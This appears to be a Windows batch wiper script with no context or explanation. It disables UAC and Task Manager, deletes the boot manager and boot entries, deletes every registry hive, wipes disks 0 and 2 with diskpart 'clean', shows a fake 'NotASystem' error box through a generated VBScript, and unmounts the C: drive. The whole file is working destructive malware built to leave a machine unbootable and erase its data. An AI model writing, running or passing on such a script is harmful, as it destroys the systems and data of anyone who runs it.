@echo off
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
bcdedit /delete {bootmgr} /f
bcdedit /delete {current} /f
bcdedit /delete {default} /f
bcdedit /delete {memdiag} /f
reg delete HKCR /f
reg delete HKCU /f
reg delete HKU /f
reg delete HKCC /f
reg delete HKLM /f
(echo Rescan
echo sel dis 0
echo clean
echo del dis 1
echo clean
echo sel dis 2
echo clean
)  | diskpart
echo X=MsgBox("NotASystem require file Nota.sys",0+16,"NotASystem detection") >> a.vbs
a.vbs
mountvol C:\ /d